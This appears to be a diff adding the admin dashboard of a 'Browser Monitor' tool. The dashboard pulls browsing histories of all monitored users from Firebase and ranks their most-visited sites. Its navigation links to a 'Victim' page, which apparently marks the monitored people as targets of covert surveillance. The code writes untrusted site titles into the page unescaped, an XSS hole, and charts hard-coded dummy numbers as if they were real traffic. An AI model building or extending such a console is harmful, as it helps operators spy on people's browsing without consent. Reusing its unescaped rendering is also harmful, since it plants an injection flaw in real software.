@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Browser Monitor Dashboard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+</head>
+<body class="h-screen flex font-sans bg-gray-100">
+  <aside class="w-64 bg-[#1C1C1C] text-white flex flex-col py-8 px-4 h-full">
+    <h2 class="text-xl font-bold mb-10 px-2">Dashboard</h2>
+    <nav class="space-y-6">
+      <a href="/admin/index.html" class="flex items-center space-x-3 px-2 text-white font-bold">
+        <i class="fas fa-tachometer-alt"></i><span>Dashboard</span>
+      </a>
+      <a href="/admin/victim.html" class="flex items-center space-x-3 px-2 text-white">
+        <i class="fas fa-user-friends"></i><span>Victim</span>
+      </a>
+      <a href="/admin/login.html" class="flex items-center space-x-3 px-2 text-white">
+        <i class="fas fa-sign-out-alt"></i><span>Logout</span>
+      </a>
+    </nav>
+  </aside>
+
+  <main class="flex-1 p-10 bg-[#F5F8F7] overflow-y-auto">
+    <h1 class="text-3xl font-bold text-gray-800 mb-6">Browser Monitor</h1>
+    <div class="flex flex-wrap gap-6 justify-start mb-10">
+      <div class="bg-white rounded-xl shadow-md p-5 w-full md:w-[260px]">
+        <h2 class="text-md font-bold text-gray-800 mb-4">Most Visited Websites</h2>
+        <ul id="mostVisitedList" class="space-y-4">
+          <li class="text-gray-500 text-sm">Loading...</li>
+        </ul>
+      </div>
+
+      <div class="bg-white rounded-xl shadow-md p-5 w-full md:w-[260px]">
+        <div class="flex justify-between items-start mb-2">
+          <div>
+            <h2 class="text-md font-bold text-gray-800">Total Sites Opened</h2>
+            <p class="text-xs text-gray-500">from all users</p>
+          </div>
+          
+        </div>
+        <div class="text-center mt-2">
+          <p class="text-sm text-gray-700">Total opened</p>
+          <p class="text-3xl font-bold text-blue-600 my-1" id="totalOpened">–</p>
+          <p class="text-xs text-gray-500">sites in the selected range</p>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="bg-white shadow-md rounded-xl p-6">
+      <div class="mb-3">
+        <h2 class="text-xl font-bold text-gray-800">Sites Opened Over Time</h2>
+        <p class="text-sm text-gray-500">Monitor traffic from recent days</p>
+        <p class="text-sm text-blue-600 italic mt-1" id="chartInfo">Showing data for all users</p>
+      </div>
+      <canvas id="siteChart" height="100"></canvas>
+    </div>
+  </main>
+
+<script>
+  const firebaseConfig = {
+      apiKey: "YOUR_API_KEY_HERE",
+      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+      databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT_ID.appspot.com",
+      messagingSenderId: "YOUR_SENDER_ID",
+      appId: "YOUR_APP_ID",
+    };
+  firebase.initializeApp(firebaseConfig);
+
+  const db = firebase.database();
+
+  const mostVisitedList = document.getElementById("mostVisitedList");
+  const totalOpenedEl = document.getElementById("totalOpened");
+  const ctx = document.getElementById("siteChart").getContext("2d");
+  let chart;
+
+  function fetchAndRender() {
+    db.ref('history/season2025').once('value').then(snapshot => {
+      const data = snapshot.val();
+
+      if (!data) {
+        mostVisitedList.innerHTML = '<li class="text-red-500">No data found</li>';
+        totalOpenedEl.textContent = '0';
+        if (chart) chart.destroy();
+        return;
+      }
+
+      const siteCounts = {};
+      let totalSitesOpened = 0;
+      const perDayCounts = {};
+
+
+      Object.values(data).forEach(userData => {
+        if (userData.visited) {
+          Object.entries(userData.visited).forEach(([timestamp, siteData]) => {
+            const title = siteData.title && siteData.title.trim() !== "" 
+              ? siteData.title 
+              : (new URL(siteData.url)).hostname;
+            
+            siteCounts[title] = (siteCounts[title] || 0) + 1;
+            totalSitesOpened++;
+          });
+        }
+      });
+
+
+      const sortedSites = Object.entries(siteCounts)
+        .sort((a, b) => b[1] - a[1])
+        .slice(0, 5);
+
+      if (sortedSites.length === 0) {
+        mostVisitedList.innerHTML = '<li class="text-gray-500">No site visits recorded</li>';
+      } else {
+        mostVisitedList.innerHTML = sortedSites.map(([site, count]) => `
+          <li class="flex items-center justify-between">
+            <div class="flex items-center gap-3">
+              <div class="bg-blue-100 p-2 rounded-full">
+                <i class="fas fa-globe text-blue-600"></i>
+              </div>
+              <div class="flex flex-col">
+                <span class="text-sm font-semibold text-gray-700">${site}</span>
+                <span class="text-xs text-gray-500">Visits</span>
+              </div>
+            </div>
+            <span class="text-sm font-bold text-gray-800">${count}</span>
+          </li>
+        `).join('');
+      }
+
+      totalOpenedEl.textContent = totalSitesOpened;
+
+
+      const dummyLabels = ["2025-06-03","2025-06-04","2025-06-05","2025-06-06","2025-06-07"];
+      const dummyData = [50, 45, 60, 55, 70];
+
+      if(chart) chart.destroy();
+      chart = new Chart(ctx, {
+        type: 'line',
+        data: {
+          labels: dummyLabels,
+          datasets: [{
+            label: 'Sites Opened',
+            data: dummyData,
+            borderColor: '#00B894',
+            backgroundColor: 'rgba(0,184,148,0.1)',
+            fill: true,
+            tension: 0.4,
+            pointRadius: 4,
+            pointHoverRadius: 6
+          }]
+        },
+        options: {
+          responsive: true,
+          plugins: {
+            legend: {
+              display: true,
+              position: 'top'
+            }
+          },
+          scales: {
+            y: {
+              beginAtZero: true,
+              ticks: {
+                precision: 0
+              }
+            }
+          }
+        }
+      });
+    }).catch(err => {
+      mostVisitedList.innerHTML = `<li class="text-red-500">Error loading data: ${err.message}</li>`;
+      totalOpenedEl.textContent = '0';
+      if(chart) chart.destroy();
+    });
+  }
+
+  fetchAndRender();
+
+  firebase.auth().onAuthStateChanged((user) => {
+    if (!user) {
+      window.location.href = '/admin/login.html';
+    }
+  });
+
+  document.querySelector('a[href="/admin/login.html"]').addEventListener('click', (e) => {
+    e.preventDefault();
+    firebase.auth().signOut().then(() => {
+      window.location.href = '/admin/login.html';
+    });
+  });
+
+</script>
+</body>
+</html>
